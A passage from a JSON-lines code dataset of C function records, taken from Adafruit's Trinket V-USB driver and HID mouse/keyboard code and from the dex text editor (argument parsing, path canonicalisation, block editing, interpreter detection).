SWITCH_CASE2(USBRQ_CLEAR_FEATURE, USBRQ_SET_FEATURE)    /* 1, 3 */\n        if(value == 0 && index == 0x81){    /* feature 0 == HALT for endpoint == 1 */\n            usbTxLen1 = rq->bRequest == USBRQ_CLEAR_FEATURE ? USBPID_NAK : USBPID_STALL;\n            usbResetDataToggling();\n        }\n#endif\n    SWITCH_CASE(USBRQ_SET_ADDRESS)          /* 5 */\n        usbNewDeviceAddr = value;\n        USB_SET_ADDRESS_HOOK();\n    SWITCH_CASE(USBRQ_GET_DESCRIPTOR)       /* 6 */\n        len = usbDriverDescriptor(rq);\n        goto skipMsgPtrAssignment;\n    SWITCH_CASE(USBRQ_GET_CONFIGURATION)    /* 8 */\n        dataPtr = &usbConfiguration;  /* send current configuration value */\n        len = 1;\n    SWITCH_CASE(USBRQ_SET_CONFIGURATION)    /* 9 */\n        usbConfiguration = value;\n        usbResetStall();\n    SWITCH_CASE(USBRQ_GET_INTERFACE)        /* 10 */\n        len = 1;\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    SWITCH_CASE(USBRQ_SET_INTERFACE)        /* 11 */\n        usbResetDataToggling();\n        usbResetStall();\n#endif\n    SWITCH_DEFAULT                          /* 7=SET_DESCRIPTOR, 12=SYNC_FRAME */\n        /* Should we add an optional hook here? */\n    SWITCH_END\n    usbMsgPtr = (usbMsgPtr_t)dataPtr;\nskipMsgPtrAssignment:\n    return len;\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "// see http://vusb.wikidot.com/driver-api\n// constants are found in usbdrv.h\n", "func_signal": "usbMsgLen_t usbFunctionSetup(uint8_t data[8])", "code": "{\n\tusb_hasCommed = 1;\n\n\t// see HID1_11.pdf sect 7.2 and http://vusb.wikidot.com/driver-api\n\tusbRequest_t *rq = (void *)data;\n\n\tif ((rq->bmRequestType & USBRQ_TYPE_MASK) != USBRQ_TYPE_CLASS)\n\t\treturn 0; // ignore request if it's not a class specific request\n\n\t// see HID1_11.pdf sect 7.2\n\tswitch (rq->bRequest)\n\t{\n\t\tcase USBRQ_HID_GET_IDLE:\n\t\t\tusbMsgPtr = &idle_rate; // send data starting from this byte\n\t\t\treturn 1; // send 1 byte\n\t\tcase USBRQ_HID_SET_IDLE:\n\t\t\tidle_rate = rq->wValue.bytes[1]; // read in idle rate\n\t\t\treturn 0; // send nothing\n\t\tcase USBRQ_HID_GET_PROTOCOL:\n\t\t\tusbMsgPtr = &protocol_version; // send data starting from this byte\n\t\t\treturn 1; // send 1 byte\n\t\tcase USBRQ_HID_SET_PROTOCOL:\n\t\t\tprotocol_version = rq->wValue.bytes[1];\n\t\t\treturn 0; // send nothing\n\t\tcase USBRQ_HID_GET_REPORT:\n\t\t\tusbMsgPtr = (uint8_t*)report_buffer; // send the report data\n\t\t\treturn 3;\n\t\tcase USBRQ_HID_SET_REPORT:\n\t\t\treturn 0; // send nothing, mouses don't do this\n\t\tdefault: // do not understand data, ignore\n\t\t\treturn 0; // send nothing\n\t}\n}", "path": "TrinketMouse\\TrinketMouseC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* usbDriverSetup() is similar to usbFunctionSetup(), but it's used for\n * standard requests instead of class and custom requests.\n */\n", "func_signal": "static inline usbMsgLen_t usbDriverSetup(usbRequest_t *rq)", "code": "{\nusbMsgLen_t len = 0;\nuchar   *dataPtr = usbTxBuf + 9;    /* there are 2 bytes free space at the end of the buffer */\nuchar   value = rq->wValue.bytes[0];\n#if USB_CFG_IMPLEMENT_HALT\nuchar   index = rq->wIndex.bytes[0];\n#endif\n\n    dataPtr[0] = 0; /* default reply common to USBRQ_GET_STATUS and USBRQ_GET_INTERFACE */\n    SWITCH_START(rq->bRequest)\n    SWITCH_CASE(USBRQ_GET_STATUS)           /* 0 */\n        uchar recipient = rq->bmRequestType & USBRQ_RCPT_MASK;  /* assign arith ops to variables to enforce byte size */\n        if(USB_CFG_IS_SELF_POWERED && recipient == USBRQ_RCPT_DEVICE)\n            dataPtr[0] =  USB_CFG_IS_SELF_POWERED;\n#if USB_CFG_IMPLEMENT_HALT\n        if(recipient == USBRQ_RCPT_ENDPOINT && index == 0x81)   /* request status for endpoint 1 */\n            dataPtr[0] = usbTxLen1 == USBPID_STALL;\n#endif\n        dataPtr[1] = 0;\n        len = 2;\n#if USB_CFG_IMPLEMENT_HALT\n    SWITCH_CASE2(USBRQ_CLEAR_FEATURE, USBRQ_SET_FEATURE)    /* 1, 3 */\n        if(value == 0 && index == 0x81){    /* feature 0 == HALT for endpoint == 1 */\n            usbTxLen1 = rq->bRequest == USBRQ_CLEAR_FEATURE ? USBPID_NAK : USBPID_STALL;\n            usbResetDataToggling();\n        }\n#endif\n    SWITCH_CASE(USBRQ_SET_ADDRESS)          /* 5 */\n        usbNewDeviceAddr = value;\n        USB_SET_ADDRESS_HOOK();\n    SWITCH_CASE(USBRQ_GET_DESCRIPTOR)       /* 6 */\n        len = usbDriverDescriptor(rq);\n        goto skipMsgPtrAssignment;\n    SWITCH_CASE(USBRQ_GET_CONFIGURATION)    /* 8 */\n        dataPtr = &usbConfiguration;  /* send current configuration value */\n        len = 1;\n    SWITCH_CASE(USBRQ_SET_CONFIGURATION)    /* 9 */\n        usbConfiguration = value;\n        usbResetStall();\n    SWITCH_CASE(USBRQ_GET_INTERFACE)        /* 10 */\n        len = 1;\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    SWITCH_CASE(USBRQ_SET_INTERFACE)        /* 11 */\n        usbResetDataToggling();\n        usbResetStall();\n#endif\n    SWITCH_DEFAULT                          /* 7=SET_DESCRIPTOR, 12=SYNC_FRAME */\n        /* Should we add an optional hook here? */\n    SWITCH_END\n    usbMsgPtr = (usbMsgPtr_t)dataPtr;\nskipMsgPtrAssignment:\n    return len;\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* usbBuildTxBlock() is called when we have data to transmit and the\n * interrupt routine's transmit buffer is empty.\n */\n", "func_signal": "static inline void usbBuildTxBlock(void)", "code": "{\nusbMsgLen_t wantLen;\nuchar       len;\n\n    wantLen = usbMsgLen;\n    if(wantLen > 8)\n        wantLen = 8;\n    usbMsgLen -= wantLen;\n    usbTxBuf[0] ^= USBPID_DATA0 ^ USBPID_DATA1; /* DATA toggling */\n    len = usbDeviceRead(usbTxBuf + 1, wantLen);\n    if(len <= 8){           /* valid data packet */\n        usbCrc16Append(&usbTxBuf[1], len);\n        len += 4;           /* length including sync byte */\n        if(len < 12)        /* a partial package identifies end of message */\n            usbMsgLen = USB_NO_MSG;\n    }else{\n        len = USBPID_STALL;   /* stall the endpoint */\n        usbMsgLen = USB_NO_MSG;\n    }\n    usbTxLen = len;\n    DBG2(0x20, usbTxBuf, len-1);\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "// see http://vusb.wikidot.com/driver-api\n// constants are found in usbdrv.h\n", "func_signal": "usbMsgLen_t usbFunctionSetup(uint8_t data[8])", "code": "{\n\tusb_hasCommed = 1;\n\n\t// see HID1_11.pdf sect 7.2 and http://vusb.wikidot.com/driver-api\n\tusbRequest_t *rq = (void *)data;\n\n\tif ((rq->bmRequestType & USBRQ_TYPE_MASK) != USBRQ_TYPE_CLASS)\n\t\treturn 0; // ignore request if it's not a class specific request\n\n\t// see HID1_11.pdf sect 7.2\n\tswitch (rq->bRequest)\n\t{\n\t\tcase USBRQ_HID_GET_IDLE:\n\t\t\tusbMsgPtr = &idle_rate; // send data starting from this byte\n\t\t\treturn 1; // send 1 byte\n\t\tcase USBRQ_HID_SET_IDLE:\n\t\t\tidle_rate = rq->wValue.bytes[1]; // read in idle rate\n\t\t\treturn 0; // send nothing\n\t\tcase USBRQ_HID_GET_PROTOCOL:\n\t\t\tusbMsgPtr = &protocol_version; // send data starting from this byte\n\t\t\treturn 1; // send 1 byte\n\t\tcase USBRQ_HID_SET_PROTOCOL:\n\t\t\tprotocol_version = rq->wValue.bytes[1];\n\t\t\treturn 0; // send nothing\n\t\tcase USBRQ_HID_GET_REPORT:\n\t\t\tusbMsgPtr = (uint8_t*)&report_buffer; // send the report data\n\t\t\treport_buffer[0] = rq->wValue.bytes[0];\n\t\t\treport_buffer[1] = report_buffer[2] = report_buffer[3] = report_buffer[4] = report_buffer[5] = report_buffer[6] = report_buffer[7] = 0; // clear the report\n\t\t\t// determine the return data length based on which report ID was requested\n\t\t\tif (rq->wValue.bytes[0] == REPID_MOUSE)      return REPSIZE_MOUSE;\n\t\t\tif (rq->wValue.bytes[0] == REPID_KEYBOARD)   return REPSIZE_KEYBOARD;\n\t\t\tif (rq->wValue.bytes[0] == REPID_MMKEY)      return REPSIZE_MMKEY;\n\t\t\tif (rq->wValue.bytes[0] == REPID_SYSCTRLKEY) return REPSIZE_SYSCTRLKEY;\n\t\t\treturn 8; // default\n\t\tcase USBRQ_HID_SET_REPORT:\n\t\t\tif (rq->wLength.word == 2) // check data is available\n\t\t\t{\n\t\t\t\t// 1st is the report byte, data is the 2nd byte.\n\t\t\t\t// We don't check report type (it can only be output or feature)\n\t\t\t\t// we never implemented \"feature\" reports so it can't be feature\n\t\t\t\t// so assume \"output\" reports\n\t\t\t\t// this means set LED status\n\t\t\t\t// since it's the only one in the descriptor\n\t\t\t\treturn USB_NO_MSG; // send nothing but call usbFunctionWrite\n\t\t\t}\n\t\t\telse // no data or do not understand data, ignore\n\t\t\t{\n\t\t\t\treturn 0; // send nothing\n\t\t\t}\n\t\tdefault: // do not understand data, ignore\n\t\t\treturn 0; // send nothing\n\t}\n}", "path": "TrinketHidCombo\\TrinketHidComboC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "static inline void usbHandleResetHook(uchar notResetState)", "code": "{\n#ifdef USB_RESET_HOOK\nstatic uchar    wasReset;\nuchar           isReset = !notResetState;\n\n    if(wasReset != isReset){\n        USB_RESET_HOOK(isReset);\n        wasReset = isReset;\n    }\n#else\n    notResetState = notResetState;  // avoid compiler warning\n#endif\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "// see HID1_11.pdf sect 7.2.6\n", "func_signal": "void usbBegin()", "code": "{\n\tcli();\n\n\t// run at full speed, because Trinket defaults to 8MHz for low voltage compatibility reasons\n\tclock_prescale_set(clock_div_1);\n\n\t// fake a disconnect to force the computer to re-enumerate\n\tPORTB &= ~(_BV(USB_CFG_DMINUS_BIT) | _BV(USB_CFG_DPLUS_BIT));\n\tusbDeviceDisconnect();\n\t_delay_ms(250);\n\tusbDeviceConnect();\n\n\t// start the USB driver\n\tusbInit();\n\tsei();\n}", "path": "TrinketMouse\\TrinketMouseC.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "static inline void  usbResetDataToggling(void)", "code": "{\n#if USB_CFG_HAVE_INTRIN_ENDPOINT && !USB_CFG_SUPPRESS_INTR_CODE\n    USB_SET_DATATOKEN1(USB_INITIAL_DATATOKEN);  /* reset data toggling for interrupt endpoint */\n#   if USB_CFG_HAVE_INTRIN_ENDPOINT3\n    USB_SET_DATATOKEN3(USB_INITIAL_DATATOKEN);  /* reset data toggling for interrupt endpoint */\n#   endif\n#endif\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* This function is similar to usbFunctionRead(), but it's also called for\n * data handled automatically by the driver (e.g. descriptor reads).\n */\n", "func_signal": "static uchar usbDeviceRead(uchar *data, uchar len)", "code": "{\n    if(len > 0){    /* don't bother app with 0 sized reads */\n#if USB_CFG_IMPLEMENT_FN_READ\n        if(usbMsgFlags & USB_FLG_USE_USER_RW){\n            len = usbFunctionRead(data, len);\n        }else\n#endif\n        {\n            uchar i = len;\n            usbMsgPtr_t r = usbMsgPtr;\n            if(usbMsgFlags & USB_FLG_MSGPTR_IS_ROM){    /* ROM data */\n                do{\n                    uchar c = USB_READ_FLASH(r);    /* assign to char size variable to enforce byte ops */\n                    *data++ = c;\n                    r++;\n                }while(--i);\n            }else{  /* RAM data */\n                do{\n                    *data++ = *((uchar *)r);\n                    r++;\n                }while(--i);\n            }\n            usbMsgPtr = r;\n        }\n    }\n    return len;\n}", "path": "TrinketKeyboard\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/* ------------------------------------------------------------------------- */\n", "func_signal": "USB_PUBLIC void usbPoll(void)", "code": "{\nschar   len;\nuchar   i;\n\n    len = usbRxLen - 3;\n    if(len >= 0){\n/* We could check CRC16 here -- but ACK has already been sent anyway. If you\n * need data integrity checks with this driver, check the CRC in your app\n * code and report errors back to the host. Since the ACK was already sent,\n * retries must be handled on application level.\n * unsigned crc = usbCrc16(buffer + 1, usbRxLen - 3);\n */\n        usbProcessRx(usbRxBuf + USB_BUFSIZE + 1 - usbInputBufOffset, len);\n#if USB_CFG_HAVE_FLOWCONTROL\n        if(usbRxLen > 0)    /* only mark as available if not inactivated */\n            usbRxLen = 0;\n#else\n        usbRxLen = 0;       /* mark rx buffer as available */\n#endif\n    }\n    if(usbTxLen & 0x10){    /* transmit system idle */\n        if(usbMsgLen != USB_NO_MSG){    /* transmit data pending? */\n            usbBuildTxBlock();\n        }\n    }\n    for(i = 20; i > 0; i--){\n        uchar usbLineStatus = USBIN & USBMASK;\n        if(usbLineStatus != 0)  /* SE0 has ended */\n            goto isNotReset;\n    }\n    /* RESET condition, called multiple times during reset */\n    usbNewDeviceAddr = 0;\n    usbDeviceAddr = 0;\n    usbResetStall();\n    DBG1(0xff, 0, 0);\nisNotReset:\n    usbHandleResetHook(i);\n}", "path": "TrinketFakeUsbSerial\\usbdrv\\usbdrv.c", "repo_name": "adafruit/Adafruit-Trinket-USB", "stars": 204, "license": "None", "language": "c", "size": 2903}
{"docstring": "/*\n * Flags and first \"--\" are removed.\n * Flag arguments are moved to beginning.\n * Other arguments come right after flag arguments.\n *\n * Returns parsed flags (order is preserved).\n */\n", "func_signal": "const char *parse_args(char **args, const char *flag_desc, int min, int max)", "code": "{\n\tstatic char flags[16];\n\tint argc = count_strings(args);\n\tint nr_flags = 0;\n\tint nr_flag_args = 0;\n\tbool flags_after_arg = true;\n\tint i, j;\n\n\tif (*flag_desc == '-') {\n\t\tflag_desc++;\n\t\tflags_after_arg = false;\n\t}\n\n\ti = 0;\n\twhile (args[i]) {\n\t\tchar *arg = args[i];\n\n\t\tif (streq(arg, \"--\")) {\n\t\t\t/* move the NULL too */\n\t\t\tmemmove(args + i, args + i + 1, (argc - i) * sizeof(*args));\n\t\t\tfree(arg);\n\t\t\targc--;\n\t\t\tbreak;\n\t\t}\n\t\tif (arg[0] != '-' || !arg[1]) {\n\t\t\tif (!flags_after_arg)\n\t\t\t\tbreak;\n\t\t\ti++;\n\t\t\tcontinue;\n\t\t}\n\n\t\tfor (j = 1; arg[j]; j++) {\n\t\t\tchar flag = arg[j];\n\t\t\tchar *flag_arg;\n\t\t\tchar *flagp = strchr(flag_desc, flag);\n\n\t\t\tif (!flagp || flag == '=') {\n\t\t\t\terror_msg(\"Invalid option -%c\", flag);\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tflags[nr_flags++] = flag;\n\t\t\tif (nr_flags == ARRAY_COUNT(flags)) {\n\t\t\t\terror_msg(\"Too many options given.\");\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tif (flagp[1] != '=')\n\t\t\t\tcontinue;\n\n\t\t\tif (j > 1 || arg[j + 1]) {\n\t\t\t\terror_msg(\"Flag -%c must be given separately because it requires an argument.\", flag);\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\tflag_arg = args[i + 1];\n\t\t\tif (!flag_arg) {\n\t\t\t\terror_msg(\"Option -%c requires on argument.\", flag);\n\t\t\t\treturn NULL;\n\t\t\t}\n\n\t\t\t/* move flag argument before any other arguments */\n\t\t\tif (i != nr_flag_args) {\n\t\t\t\t// farg1 arg1  arg2 -f   farg2 arg3\n\t\t\t\t// farg1 farg2 arg1 arg2 arg3\n\t\t\t\tint count = i - nr_flag_args;\n\t\t\t\tmemmove(args + nr_flag_args + 1, args + nr_flag_args, count * sizeof(*args));\n\t\t\t}\n\t\t\targs[nr_flag_args++] = flag_arg;\n\t\t\ti++;\n\t\t}\n\n\t\tmemmove(args + i, args + i + 1, (argc - i) * sizeof(*args));\n\t\tfree(arg);\n\t\targc--;\n\t}\n\n\t// don't count arguments to flags as arguments to command\n\targc -= nr_flag_args;\n\n\tif (argc < min) {\n\t\terror_msg(\"Not enough arguments\");\n\t\treturn NULL;\n\t}\n\tif (max >= 0 && argc > max) {\n\t\terror_msg(\"Too many arguments\");\n\t\treturn NULL;\n\t}\n\tflags[nr_flags] = 0;\n\treturn flags;\n}", "path": "parse-args.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * canonicalizes path name\n *\n *   - replaces double-slashes with one slash\n *   - removes any \".\" or \"..\" path components\n *   - makes path absolute\n *   - expands symbolic links\n *   - checks that all but the last expanded path component are directories\n *   - last path component is allowed to not exist\n */\n", "func_signal": "char *path_absolute(const char *filename)", "code": "{\n\tint depth = 0;\n\tchar buf[8192];\n\tchar *sp;\n\n\tif (!make_absolute(buf, sizeof(buf), filename))\n\t\treturn NULL;\n\n\tremove_double_slashes(buf);\n\n\t// for each component:\n\t//     remove \".\"\n\t//     remove \"..\" and previous component\n\t//     if symlink then replace with link destination and start over\n\n\tsp = buf + 1;\n\twhile (*sp) {\n\t\tstruct stat st;\n\t\tchar *ep = strchr(sp, '/');\n\t\tbool last = !ep;\n\t\tint rc;\n\n\t\tif (ep)\n\t\t\t*ep = 0;\n\t\tif (streq(sp, \".\")) {\n\t\t\tif (last) {\n\t\t\t\t*sp = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tmemmove(sp, ep + 1, strlen(ep + 1) + 1);\n\t\t\tcontinue;\n\t\t}\n\t\tif (streq(sp, \"..\")) {\n\t\t\tif (sp != buf + 1) {\n\t\t\t\t// not first component, remove previous component\n\t\t\t\tsp--;\n\t\t\t\twhile (sp[-1] != '/')\n\t\t\t\t\tsp--;\n\t\t\t}\n\n\t\t\tif (last) {\n\t\t\t\t*sp = 0;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tmemmove(sp, ep + 1, strlen(ep + 1) + 1);\n\t\t\tcontinue;\n\t\t}\n\n\t\trc = lstat(buf, &st);\n\t\tif (rc) {\n\t\t\tif (last && errno == ENOENT)\n\t\t\t\tbreak;\n\t\t\treturn NULL;\n\t\t}\n\n\t\tif (S_ISLNK(st.st_mode)) {\n\t\t\tchar target[8192];\n\t\t\tchar tmp[8192];\n\t\t\tint target_len;\n\t\t\tint total_len = 0;\n\t\t\tint buf_len = sp - 1 - buf;\n\t\t\tint rest_len = 0;\n\t\t\tint pos = 0;\n\t\t\tconst char *rest = NULL;\n\n\t\t\tif (!last) {\n\t\t\t\trest = ep + 1;\n\t\t\t\trest_len = strlen(rest);\n\t\t\t}\n\t\t\tif (++depth > 8) {\n\t\t\t\terrno = ELOOP;\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\ttarget_len = readlink(buf, target, sizeof(target));\n\t\t\tif (target_len < 0)\n\t\t\t\treturn NULL;\n\t\t\tif (target_len == sizeof(target)) {\n\t\t\t\terrno = ENAMETOOLONG;\n\t\t\t\treturn NULL;\n\t\t\t}\n\t\t\ttarget[target_len] = 0;\n\n\t\t\t// calculate length\n\t\t\tif (target[0] != '/')\n\t\t\t\ttotal_len = buf_len + 1;\n\t\t\ttotal_len += target_len;\n\t\t\tif (rest)\n\t\t\t\ttotal_len += 1 + rest_len;\n\t\t\tif (total_len + 1 > sizeof(tmp)) {\n\t\t\t\terrno = ENAMETOOLONG;\n\t\t\t\treturn NULL;\n\t\t\t}\n\n\t\t\t// build new path\n\t\t\tif (target[0] != '/') {\n\t\t\t\tmemcpy(tmp, buf, buf_len);\n\t\t\t\tpos += buf_len;\n\t\t\t\ttmp[pos++] = '/';\n\t\t\t}\n\t\t\tmemcpy(tmp + pos, target, target_len);\n\t\t\tpos += target_len;\n\t\t\tif (rest) {\n\t\t\t\ttmp[pos++] = '/';\n\t\t\t\tmemcpy(tmp + pos, rest, rest_len);\n\t\t\t\tpos += rest_len;\n\t\t\t}\n\t\t\ttmp[pos] = 0;\n\t\t\tpos = remove_double_slashes(tmp);\n\n\t\t\t// restart\n\t\t\tmemcpy(buf, tmp, pos + 1);\n\t\t\tsp = buf + 1;\n\t\t\tcontinue;\n\t\t}\n\n\t\tif (last)\n\t\t\tbreak;\n\n\t\tif (!S_ISDIR(st.st_mode)) {\n\t\t\terrno = ENOTDIR;\n\t\t\treturn NULL;\n\t\t}\n\n\t\t*ep = '/';\n\t\tsp = ep + 1;\n\t}\n\treturn xstrdup(buf);\n}", "path": "path.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * Combine current block and new data into smaller blocks:\n *   - Block _must_ contain whole lines\n *   - Block _must_ contain at least one line\n *   - Preferred maximum size of block is BLOCK_EDIT_SIZE\n *   - Size of any block can be larger than BLOCK_EDIT_SIZE\n *     only if there's a very long line\n */\n", "func_signal": "static long split_and_insert(const char *buf, long len)", "code": "{\n\tstruct block *blk = view->cursor.blk;\n\tstruct list_head *prev_node = blk->node.prev;\n\tconst char *buf1 = blk->data;\n\tconst char *buf2 = buf;\n\tconst char *buf3 = blk->data + view->cursor.offset;\n\tlong size1 = view->cursor.offset;\n\tlong size2 = len;\n\tlong size3 = blk->size - size1;\n\tlong total = size1 + size2 + size3;\n\tlong start = 0; // beginning of new block\n\tlong size = 0;  // size of new block\n\tlong pos = 0;   // current position\n\tlong nl_added = 0;\n\n\twhile (start < total) {\n\t\t// size of new block if next line would be added\n\t\tlong new_size = 0;\n\t\tlong copied = 0;\n\t\tstruct block *new;\n\n\t\tif (pos < size1) {\n\t\t\tconst char *nl = memchr(buf1 + pos, '\\n', size1 - pos);\n\t\t\tif (nl)\n\t\t\t\tnew_size = nl - buf1 + 1 - start;\n\t\t}\n\n\t\tif (!new_size && pos < size1 + size2) {\n\t\t\tlong offset = 0;\n\t\t\tconst char *nl;\n\n\t\t\tif (pos > size1)\n\t\t\t\toffset = pos - size1;\n\n\t\t\tnl = memchr(buf2 + offset, '\\n', size2 - offset);\n\t\t\tif (nl)\n\t\t\t\tnew_size = size1 + nl - buf2 + 1 - start;\n\t\t}\n\n\t\tif (!new_size && pos < total) {\n\t\t\tlong offset = 0;\n\t\t\tconst char *nl;\n\n\t\t\tif (pos > size1 + size2)\n\t\t\t\toffset = pos - size1 - size2;\n\n\t\t\tnl = memchr(buf3 + offset, '\\n', size3 - offset);\n\t\t\tif (nl)\n\t\t\t\tnew_size = size1 + size2 + nl - buf3 + 1 - start;\n\t\t\telse\n\t\t\t\tnew_size = total - start;\n\t\t}\n\n\t\tif (new_size <= BLOCK_EDIT_SIZE) {\n\t\t\t// fits\n\t\t\tsize = new_size;\n\t\t\tpos = start + new_size;\n\t\t\tif (pos < total)\n\t\t\t\tcontinue;\n\t\t} else {\n\t\t\t// does not fit\n\t\t\tif (!size) {\n\t\t\t\t// one block containing one very long line\n\t\t\t\tsize = new_size;\n\t\t\t\tpos = start + new_size;\n\t\t\t}\n\t\t}\n\n\t\tBUG_ON(!size);\n\t\tnew = block_new(size);\n\t\tif (start < size1) {\n\t\t\tlong avail = size1 - start;\n\t\t\tlong count = size;\n\n\t\t\tif (count > avail)\n\t\t\t\tcount = avail;\n\t\t\tnew->nl += copy_count_nl(new->data, buf1 + start, count);\n\t\t\tcopied += count;\n\t\t\tstart += count;\n\t\t}\n\t\tif (start >= size1 && start < size1 + size2) {\n\t\t\tlong offset = start - size1;\n\t\t\tlong avail = size2 - offset;\n\t\t\tlong count = size - copied;\n\n\t\t\tif (count > avail)\n\t\t\t\tcount = avail;\n\t\t\tnew->nl += copy_count_nl(new->data + copied, buf2 + offset, count);\n\t\t\tcopied += count;\n\t\t\tstart += count;\n\t\t}\n\t\tif (start >= size1 + size2) {\n\t\t\tlong offset = start - size1 - size2;\n\t\t\tlong avail = size3 - offset;\n\t\t\tlong count = size - copied;\n\n\t\t\tBUG_ON(count > avail);\n\t\t\tnew->nl += copy_count_nl(new->data + copied, buf3 + offset, count);\n\t\t\tcopied += count;\n\t\t\tstart += count;\n\t\t}\n\n\t\tnew->size = size;\n\t\tBUG_ON(copied != size);\n\t\tlist_add_before(&new->node, &blk->node);\n\n\t\tnl_added += new->nl;\n\t\tsize = 0;\n\t}\n\n\tview->cursor.blk = BLOCK(prev_node->next);\n\twhile (view->cursor.offset > view->cursor.blk->size) {\n\t\tview->cursor.offset -= view->cursor.blk->size;\n\t\tview->cursor.blk = BLOCK(view->cursor.blk->node.next);\n\t}\n\n\tnl_added -= blk->nl;\n\tdelete_block(blk);\n\treturn nl_added;\n}", "path": "block.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// NOTE: buf must contain whole characters!\n", "func_signal": "ssize_t file_encoder_write(struct file_encoder *enc, const unsigned char *buf, ssize_t size)", "code": "{\n\tif (enc->nls == NEWLINE_DOS) {\n\t\tsize = unix_to_dos(enc, buf, size);\n\t\tbuf = enc->nbuf;\n\t}\n\n\tif (enc->cconv == NULL)\n\t\treturn xwrite(enc->fd, buf, size);\n\n\tcconv_process(enc->cconv, buf, size);\n\tcconv_flush(enc->cconv);\n\tbuf = cconv_consume_all(enc->cconv, &size);\n\treturn xwrite(enc->fd, buf, size);\n}", "path": "encoder.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * Parse #! line and return interpreter name without vesion number.\n * For example if file's first line is \"#!/usr/bin/env python2\" then\n * \"python\" is returned.\n */\n", "func_signal": "char *detect_interpreter(struct buffer *b)", "code": "{\n\tBLOCK_ITER(bi, &b->blocks);\n\tPTR_ARRAY(m);\n\tstruct lineref lr;\n\tchar *ret;\n\n\tfill_line_ref(&bi, &lr);\n\tif (!regexp_match(\"^#!\\\\s*/.*(/env\\\\s+|/)([a-zA-Z_-]+)[0-9.]*(\\\\s|$)\", lr.line, lr.size, &m))\n\t\treturn NULL;\n\n\tret = xstrdup(m.ptrs[2]);\n\tptr_array_free(&m);\n\n\tif (!streq(ret, \"sh\"))\n\t\treturn ret;\n\n\t/*\n\t * #!/bin/sh\n\t * # the next line restarts using wish \\\n\t * exec wish \"$0\" \"$@\"\n\t */\n\tif (!next_line(&bi, &lr) || !regexp_match_nosub(\"^#.*\\\\\\\\$\", lr.line, lr.size))\n\t\treturn ret;\n\n\tif (!next_line(&bi, &lr) || !regexp_match_nosub(\"^exec\\\\s+wish\\\\s+\", lr.line, lr.size))\n\t\treturn ret;\n\n\tfree(ret);\n\treturn xstrdup(\"wish\");\n}", "path": "detect.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "/*\n * Move to beginning of next line.\n * If there is no next line iterator is not advanced.\n * Returns number of bytes iterator advanced.\n */\n", "func_signal": "long block_iter_next_line(struct block_iter *bi)", "code": "{\n\tlong offset;\n\tlong new_offset;\n\n\tblock_iter_normalize(bi);\n\n\toffset = bi->offset;\n\tif (offset == bi->blk->size)\n\t\treturn 0;\n\n\t// there must be at least one newline\n\tif (bi->blk->nl == 1) {\n\t\tnew_offset = bi->blk->size;\n\t} else {\n\t\tconst unsigned char *end;\n\t\tend = memchr(bi->blk->data + offset, '\\n', bi->blk->size - offset);\n\t\tnew_offset = end + 1 - bi->blk->data;\n\t}\n\tif (new_offset == bi->blk->size && bi->blk->node.next == bi->head)\n\t\treturn 0;\n\n\tbi->offset = new_offset;\n\treturn bi->offset - offset;\n}", "path": "iter.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
{"docstring": "// odd number of backslashes at end of line?\n", "func_signal": "static bool has_line_continuation(const char *str, int len)", "code": "{\n\tint pos = len - 1;\n\n\twhile (pos >= 0 && str[pos] == '\\\\')\n\t\tpos--;\n\treturn (len - 1 - pos) % 2;\n}", "path": "config.c", "repo_name": "tihirvon/dex", "stars": 163, "license": "gpl-2.0", "language": "c", "size": 4446}
